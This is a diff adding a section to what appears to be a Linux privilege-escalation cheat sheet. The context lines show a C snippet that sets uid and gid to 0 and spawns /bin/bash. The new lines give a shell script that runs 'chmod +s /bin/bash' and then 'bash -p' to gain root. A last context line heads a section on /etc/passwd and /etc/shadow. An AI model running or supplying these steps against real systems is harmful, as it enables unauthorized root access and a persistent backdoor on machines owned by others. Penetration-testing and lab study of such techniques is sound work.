@@ -64,6 +64,15 @@ void fowzmalbec()
 setuid(0); setgid(0); system("/bin/bash");
 }
 ```
+#### PrivESC Methodology for Linux - setting SUID bit on /bin/bash
+> 1. Make a bash script file with following contents and make file executable. 
+```bash
+#!/bin/sh
+
+chmod +s /bin/bash
+```
+> 1. check the **SUID** bit set on **/bin/bash**.
+> 1. /bin/bash -p (you shoud be **root**).
 
 #### PrivESC Methodology for Linux - /etc/passwd && /etc/shadow
 > 1. Check who owns -> ls -lart /etc/passwd && who owns ls -lart /etc/shadow. 
